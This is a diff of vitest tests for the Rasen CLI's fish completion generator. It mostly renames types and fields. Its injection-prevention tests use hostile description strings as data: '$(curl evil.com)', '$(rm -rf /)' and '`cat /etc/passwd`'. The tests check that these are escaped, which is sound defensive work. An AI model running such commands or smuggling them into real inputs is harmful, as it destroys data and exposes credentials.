@@ -1,6 +1,6 @@
 import { describe, it, expect, beforeEach } from 'vitest';
 import { FishGenerator } from '../../../../src/core/completions/generators/fish-generator.js';
-import { CommandDefinition } from '../../../../src/core/completions/types.js';
+import { ResolvedCommandDefinition } from '../../../../src/core/completions/types.js';
 
 describe('FishGenerator', () => {
   let generator: FishGenerator;
@@ -21,7 +21,7 @@ describe('FishGenerator', () => {
 
   describe('generate', () => {
     it('should generate valid fish completion script with header', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'init',
           description: 'Initialize Rasen',
@@ -36,7 +36,7 @@ describe('FishGenerator', () => {
     });
 
     it('should generate helper functions for Fish', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'init',
           description: 'Initialize Rasen',
@@ -52,7 +52,7 @@ describe('FishGenerator', () => {
     });
 
     it('should include all commands with descriptions', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'init',
           description: 'Initialize Rasen',
@@ -82,7 +82,7 @@ describe('FishGenerator', () => {
     });
 
     it('should handle commands with flags without short options', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'validate',
           description: 'Validate specs',
@@ -108,7 +108,7 @@ describe('FishGenerator', () => {
     });
 
     it('should handle flags with short options', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'show',
           description: 'Show a spec',
@@ -132,7 +132,7 @@ describe('FishGenerator', () => {
     });
 
     it('should use -r flag for flags that require values', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'validate',
           description: 'Validate specs',
@@ -153,7 +153,7 @@ describe('FishGenerator', () => {
     });
 
     it('should not use -r flag for boolean flags', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'validate',
           description: 'Validate specs',
@@ -176,7 +176,7 @@ describe('FishGenerator', () => {
     });
 
     it('should handle flags with enum values', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'validate',
           description: 'Validate specs',
@@ -185,7 +185,7 @@ describe('FishGenerator', () => {
               name: 'type',
               description: 'Specify item type',
               takesValue: true,
-              values: ['change', 'spec'],
+              completionValues: ['change', 'spec'],
             },
           ],
         },
@@ -199,7 +199,7 @@ describe('FishGenerator', () => {
     });
 
     it('should handle commands with subcommands', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'change',
           description: 'Manage changes',
@@ -228,7 +228,7 @@ describe('FishGenerator', () => {
     });
 
     it('should handle positional arguments for change-id', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'archive',
           description: 'Archive a change',
@@ -244,7 +244,7 @@ describe('FishGenerator', () => {
     });
 
     it('should handle positional arguments for spec-id', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'show-spec',
           description: 'Show a spec',
@@ -260,7 +260,7 @@ describe('FishGenerator', () => {
     });
 
     it('should handle positional arguments for change-or-spec-id', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'show',
           description: 'Show an item',
@@ -276,7 +276,7 @@ describe('FishGenerator', () => {
     });
 
     it('should handle positional arguments for shell with inline values', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'generate',
           description: 'Generate completions',
@@ -295,7 +295,7 @@ describe('FishGenerator', () => {
     });
 
     it('should handle positional arguments for schema names', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'schema',
           description: 'Manage schemas',
@@ -312,7 +312,7 @@ describe('FishGenerator', () => {
     });
 
     it('should handle positional arguments for profile names', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'profile-use',
           description: 'Use a profile',
@@ -329,7 +329,7 @@ describe('FishGenerator', () => {
     });
 
     it('should generate dynamic completion helper for changes', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'archive',
           description: 'Archive a change',
@@ -348,7 +348,7 @@ describe('FishGenerator', () => {
     });
 
     it('should generate dynamic completion helper for specs', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'show-spec',
           description: 'Show a spec',
@@ -365,7 +365,7 @@ describe('FishGenerator', () => {
     });
 
     it('should generate dynamic completion helper for items', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'show',
           description: 'Show an item',
@@ -383,7 +383,7 @@ describe('FishGenerator', () => {
     });
 
     it('should escape single quotes in descriptions', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'test',
           description: "Test with 'quotes'",
@@ -402,7 +402,7 @@ describe('FishGenerator', () => {
     });
 
     it('should handle complex nested subcommands with flags', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'spec',
           description: 'Manage specs',
@@ -438,7 +438,7 @@ describe('FishGenerator', () => {
     });
 
     it('should handle empty command list', () => {
-      const commands: CommandDefinition[] = [];
+      const commands: ResolvedCommandDefinition[] = [];
 
       const script = generator.generate(commands);
 
@@ -447,7 +447,7 @@ describe('FishGenerator', () => {
     });
 
     it('should handle commands with no flags', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'view',
           description: 'Display dashboard',
@@ -464,7 +464,7 @@ describe('FishGenerator', () => {
 
   describe('filename completion scope', () => {
     it('should disable the default filename fallback for rasen', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'init',
           description: 'Initialize Rasen',
@@ -481,7 +481,7 @@ describe('FishGenerator', () => {
     });
 
     it('should force filename completion back on for path positionals', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'init',
           description: 'Initialize Rasen',
@@ -504,7 +504,7 @@ describe('FishGenerator', () => {
     });
 
     it('should not force files for non-path positionals', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'show',
           description: 'Show an item',
@@ -529,7 +529,7 @@ describe('FishGenerator', () => {
 
   describe('security - command injection prevention', () => {
     it('should escape $() command substitution in descriptions', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'test',
           description: 'Test command $(curl evil.com)',
@@ -546,7 +546,7 @@ describe('FishGenerator', () => {
     });
 
     it('should escape backticks in descriptions', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'test',
           description: 'Test command `whoami`',
@@ -563,7 +563,7 @@ describe('FishGenerator', () => {
     });
 
     it('should escape dollar signs in descriptions', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'test',
           description: 'Test with $variable',
@@ -578,7 +578,7 @@ describe('FishGenerator', () => {
     });
 
     it('should escape single quotes in descriptions', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'test',
           description: "Test with 'quotes'",
@@ -593,7 +593,7 @@ describe('FishGenerator', () => {
     });
 
     it('should escape backslashes in descriptions', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'test',
           description: 'Test with \\ backslash',
@@ -608,7 +608,7 @@ describe('FishGenerator', () => {
     });
 
     it('should handle multiple shell metacharacters together', () => {
-      const commands: CommandDefinition[] = [
+      const commands: ResolvedCommandDefinition[] = [
         {
           name: 'test',
           description: "Dangerous: $(rm -rf /) `cat /etc/passwd` $HOME 'quoted'",
